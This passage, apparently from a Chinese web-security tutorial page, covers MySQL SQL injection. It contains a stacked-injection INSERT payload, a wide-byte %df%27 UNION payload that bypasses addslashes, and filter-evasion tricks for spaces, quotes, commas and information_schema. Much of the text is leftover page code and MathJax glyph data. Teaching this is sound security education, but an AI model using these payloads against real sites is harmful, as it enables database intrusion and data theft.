<span class="line"><span style="color:#24292E;">    password </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">input</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Give me your password: &quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Login success&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> query(username, password) </span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;Login failed&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__name__</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;__main__&quot;</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">    main()</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p><img src="https://cdn.xyxsw.site/boxcnl67uDDSIdh3J7y7Jxjk0dc.png" alt=""></p><p>这样一来如果 SQL 语句执行报错的话，错误信息就会被打印出来</p><p>我收集了十个在 MySQL 中常见的可以用来进行报错注入的函数，我将他们常见的攻击手法都整理一下，放在底下供大家参考，原理和先前的有回显注入的方式并无区别。</p><p>关于函数的原型与定义可以翻阅 MySQL 文档</p><p>MySQL 5.7 doc: <a href="https://dev.mysql.com/doc/refman/5.7/en/" target="_blank" rel="noreferrer">https://dev.mysql.com/doc/refman/5.7/en/</a></p><p>MySQL 8.0 doc: <a href="https://dev.mysql.com/doc/refman/8.0/en/" target="_blank" rel="noreferrer">https://dev.mysql.com/doc/refman/8.0/en/</a></p><p>需要注意的是旧版本的某些函数在新版本中可能已经失效，具体在这里不一一列举</p><ol><li><code>floor</code></li><li><code>extractvalue</code></li><li><code>updatexml</code></li><li><code>geometrycollection</code></li><li><code>multipoint</code></li><li><code>polygon</code></li><li><code>multipolygon</code></li><li><code>linestring</code></li><li><code>multilinestring</code></li><li><code>exp</code></li></ol><h3 id="堆叠注入" tabindex="-1">堆叠注入 <a class="header-anchor" href="#堆叠注入" aria-label="Permalink to &quot;堆叠注入&quot;">​</a></h3><p>当注入点使用的执行函数允许一次性执行多个 SQL 语句的时候，例如 PHP 中的 <code>multi_query</code> ，堆叠注入即存在。堆叠注入相较于其他方式，利用的手法更加自由，不局限于原来的 SELECT 语句，而可以拓展到 INSERT、SHOW、SET、UPDATE 语句等。</p><p><code>Liki4&#39;;INSERT INTO users VALUES (&#39;Liki3&#39;,&#39;01848f8e70090495a136698a41c5b37406968c648ab12133e0f256b2364b5bb5&#39;);#</code></p><p><img src="https://cdn.xyxsw.site/boxcnrMIc2m6oubxC86CEtw1jMe.png" alt=""></p><p><img src="https://cdn.xyxsw.site/boxcnVRdntvakiTpt7nP8JhKKfc.png" alt=""></p><p>INSERT 语句也被成功执行了，向数据库中插入了 Liki3 的数据</p><h3 id="二次注入" tabindex="-1">二次注入 <a class="header-anchor" href="#二次注入" aria-label="Permalink to &quot;二次注入&quot;">​</a></h3><p>二次注入的原理与前面所有的注入方式一致，仅仅在于触发点不同。</p><p>在某些 Web 应用中，注册时对用户的输入做了良好的预处理，但在后续使用的过程中存在未做处理的注入点，此时即可能造成二次注入</p><p>常见的场景，例如某平台在用户注册时无法进行 SQL 注入利用，但在登陆后的用户个人信息界面进行数据查询时存在可利用的注入点。</p><p>那么我们在注册的时候即便无法当即触发 SQL 注入，但可以将恶意 payload 暂时写入到数据库中，这样一来当我们访问个人信息界面查询这个恶意 payload 的时候即会在可利用的注入点触发 SQL 注入。</p><h2 id="sql-注入常见的过滤绕过方式" tabindex="-1">SQL 注入常见的过滤绕过方式 <a class="header-anchor" href="#sql-注入常见的过滤绕过方式" aria-label="Permalink to &quot;SQL 注入常见的过滤绕过方式&quot;">​</a></h2><h3 id="空格被过滤" tabindex="-1">空格被过滤 <a class="header-anchor" href="#空格被过滤" aria-label="Permalink to &quot;空格被过滤&quot;">​</a></h3><ol><li><code>/*xxx*/</code> MySQL 行内注释</li></ol><p><code>SELECT/*1*/username,password/*1*/FROM/*1*/users;</code></p><ol><li><code>()</code></li></ol><p><code>SELECT(username),(password)FROM(users);</code></p><ol><li><code>%20 %09 %0a %0b %0c %0d %a0 %00</code> 等不可见字符</li></ol><h3 id="引号被过滤" tabindex="-1">引号被过滤 <a class="header-anchor" href="#引号被过滤" aria-label="Permalink to &quot;引号被过滤&quot;">​</a></h3><ol><li>十六进制代替字符串</li></ol><p><code>SELECT username, password FROM users WHERE username=0x4c696b6934</code></p><h3 id="逗号被过滤" tabindex="-1">逗号被过滤 <a class="header-anchor" href="#逗号被过滤" aria-label="Permalink to &quot;逗号被过滤&quot;">​</a></h3><ol><li><code>from for</code></li></ol><p><code>select substr(database(),1,1);</code></p><p><code>select substr(database() from 1 for 1);</code></p><p><code>select mid(database() from 1 for 1);</code></p><ol><li><code>join</code></li></ol><p><code>select 1,2</code></p><p><code>select * from (select 1)a join (select 2)b</code></p><ol><li><code>like/rlike</code></li></ol><p><code>select ascii(mid(user(),1,1))=80</code></p><p><code>select user() like &#39;r%&#39;</code></p><ol><li><code>offset</code></li></ol><p><code>select * from news limit 0,1</code></p><p><code>select * from news limit 1 offset 0</code></p><h3 id="比较符号-被过滤" tabindex="-1">比较符号 <code>(&lt;=&gt;)</code> 被过滤 <a class="header-anchor" href="#比较符号-被过滤" aria-label="Permalink to &quot;比较符号 \`(&lt;=&gt;)\` 被过滤&quot;">​</a></h3><ol><li><code>=</code> 用 <code>like, rlike, regexp</code> 代替</li></ol><p><code>select * from users where name like &#39;Liki4&#39;</code></p><p><code>select * from users where name rlike &#39;Liki4&#39;</code></p><p><code>select * from users where name regexp &#39;Liki4&#39;</code></p><ol><li><code>&lt;&gt;</code> 用 <code>greatest()、least()</code></li></ol><p><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></p><p><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></p><ol><li><code>between</code></li></ol><p><code>select * from users where id between 1 and 1;</code></p><h3 id="or-and-xor-not-被过滤" tabindex="-1"><code>or and xor not</code> 被过滤 <a class="header-anchor" href="#or-and-xor-not-被过滤" aria-label="Permalink to &quot;\`or and xor not\` 被过滤&quot;">​</a></h3><ol><li><code>and = &amp;&amp;</code></li><li><code>or = ||</code></li><li><code>xor = |</code></li><li><code>not = !</code></li></ol><h3 id="常用函数被过滤" tabindex="-1">常用函数被过滤 <a class="header-anchor" href="#常用函数被过滤" aria-label="Permalink to &quot;常用函数被过滤&quot;">​</a></h3><ol><li><code>hex()、bin() = ascii()</code></li><li><code>sleep() = benchmark()</code></li><li><code>concat_ws() = group_concat()</code></li><li><code>mid()、substr() = substring()</code></li><li><code>@@user = user()</code></li><li><code>@@datadir = datadir()</code></li></ol><h3 id="宽字节注入" tabindex="-1">宽字节注入 <a class="header-anchor" href="#宽字节注入" aria-label="Permalink to &quot;宽字节注入&quot;">​</a></h3><p>在 GB2312、GBK、GB18030、BIG5、Shift_JIS 等编码下来吃掉 ASCII 字符的方法，可以用来绕过 <code>addslashes()</code><code>id=0%df%27%20union%20select%201,2,database();</code></p><p><img src="https://cdn.xyxsw.site/boxcnaRtyUGC0sX3btnFIgpDCob.png" alt=""></p><h3 id="information-schema-被过滤" tabindex="-1">information_schema 被过滤 <a class="header-anchor" href="#information-schema-被过滤" aria-label="Permalink to &quot;information_schema 被过滤&quot;">​</a></h3><p>在 SQL 注入中， <code>infromation_schema</code> 库的作用无非就是可以获取到 <code>table_schema, table_name, column_name</code> 这些数据库内的信息。</p><h4 id="mysql-5-6-的新特性" tabindex="-1">MySQL 5.6 的新特性 <a class="header-anchor" href="#mysql-5-6-的新特性" aria-label="Permalink to &quot;MySQL 5.6 的新特性&quot;">​</a></h4><p>在 MySQL 5.5.x 之后的版本，MySQL 开始将 innoDB 引擎作为 MySQL 的默认引擎，因此从 MySQL 5.6.x 版本开始，MySQL 在数据库中添加了两张表， <code>innodb_index_stats</code> 和 <code>innodb_table_stats</code> ，两张表都会存储数据库和对应的数据表。</p><p>因此，从 MySQL 5.6.x 开始，有了取代 <code>information_schema</code> 的表名查询方式，如下所示</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">select table_name </span><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> mysql.innodb_index_stats where database_name</span><span style="color:#F97583;">=*</span><span style="color:#E1E4E8;">database</span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;">()</span><span style="color:#FDAEB7;font-style:italic;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">select table_name </span><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> mysql.innodb_table_stats where database_name</span><span style="color:#F97583;">=*</span><span style="color:#E1E4E8;">database</span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;">()</span><span style="color:#FDAEB7;font-style:italic;">;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">select table_name </span><span style="color:#D73A49;">from</span><span style="color:#24292E;"> mysql.innodb_index_stats where database_name</span><span style="color:#D73A49;">=*</span><span style="color:#24292E;">database</span><span style="color:#D73A49;">*</span><span style="color:#24292E;">()</span><span style="color:#B31D28;font-style:italic;">;</span></span>
<span class="line"><span style="color:#24292E;">select table_name </span><span style="color:#D73A49;">from</span><span style="color:#24292E;"> mysql.innodb_table_stats where database_name</span><span style="color:#D73A49;">=*</span><span style="color:#24292E;">database</span><span style="color:#D73A49;">*</span><span style="color:#24292E;">()</span><span style="color:#B31D28;font-style:italic;">;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="https://cdn.xyxsw.site/boxcnbMtjAq8osStjcSbFuIdDSc.png" alt=""></p><h4 id="mysql-5-7-的新特性" tabindex="-1">MySQL 5.7 的新特性 <a class="header-anchor" href="#mysql-5-7-的新特性" aria-label="Permalink to &quot;MySQL 5.7 的新特性&quot;">​</a></h4><p>由于 <code>performance_schema</code> 过于发杂，所以 MySQL 在 5.7 版本中新增了 <code>Sys schema</code> 视图，基础数据来自于 <code>performance_chema</code> 和 <code>information_schema</code> 两个库。</p><p>而其中有这样一个视图， <code>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer</code> ，我们可以翻阅官方文档对其的解释</p>`,216),c={class:"MathJax",jax:"SVG",style:{direction:"ltr",position:"relative"}},r={style:{overflow:"visible","min-height":"1px","min-width":"1px","vertical-align":"-0.464ex"},xmlns:"http://www.w3.org/2000/svg",width:"33.197ex",height:"2.161ex",role:"img",focusable:"false",viewBox:"0 -750 14673.2 955","aria-hidden":"true"},y=n('<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z" style="stroke-width:3;"></path></g><g data-mml-node="msub" transform="translate(503,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z" style="stroke-width:3;"></path></g></g><g data-mml-node="mi" transform="translate(1386.6,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(1819.6,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(2395.6,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(2861.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width:3;"></path></g><g data-mml-node="msub" transform="translate(3739.6,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(562,-150) scale(0.707)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z" style="stroke-width:3;"></path></g></g><g data-mml-node="mi" transform="translate(4606.9,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(5135.9,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(5564.9,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width:3;"></path></g><g data-mml-node="msub" transform="translate(5862.9,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z" style="stroke-width:3;"></path></g></g><g data-mml-node="mi" transform="translate(6743.5,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(7104.5,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(7633.5,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(7994.5,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(8339.5,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(8808.5,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(9169.5,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(9514.5,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z" style="stroke-width:3;"></path></g><g data-mml-node="msub" transform="translate(9947.5,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width:3;"></path></g></g><g data-mml-node="mi" transform="translate(10743.5,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z" style="stroke-width:3;"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(11228.5,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="mi" transform="translate(12228.5,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 